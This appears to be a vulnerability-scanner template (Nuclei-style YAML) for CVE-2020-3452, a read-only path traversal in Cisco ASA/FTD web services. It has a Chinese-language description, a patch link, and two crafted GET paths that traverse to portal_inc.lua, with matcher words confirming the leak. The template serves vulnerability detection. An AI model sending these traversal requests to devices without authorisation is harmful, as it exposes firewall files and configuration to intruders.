id: CVE-2020-3452
info:
  name: Cisco Adaptive Security Appliance (ASA) and Firepower Threat Defense (FTD)
    - Arbitrary File Retrieval
  author:
  - l0ne1y
  description: |-
    Cisco ASA/FTD AnyConnect 任意远程文件读取漏洞
    Cisco Firepower Threat Defense是一套提供下一代防火墙服务的统一软件。Cisco Adaptive Security Appliances Software是一套防火墙和网络安全平台。该平台提供了对数据和网络资源的高度安全的访问等功能。<br />
    Cisco ASA Software和FTD Software的web服务接口存在只读路径遍历漏洞。该漏洞源于程序未正确验证HTTP请求中的URL输入。未经授权的远程攻击者可利用向受影响设备发送特制的包含目录遍历字符序列的HTTP请求发起目录遍历攻击并读取目标系统上的敏感文件。<br />
    &nbsp;
  severity: high
  remediation: |-
    **官方修复方案：**
    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86
requests:
- matchers:
  - type: word
    condition: and
    words:
    - INTERNAL_PASSWORD_ENABLED
    - CONF_VIRTUAL_KEYBOARD
  path:
  - '{{BaseURL}}/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../'
  - '{{BaseURL}}/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua'
  method: GET
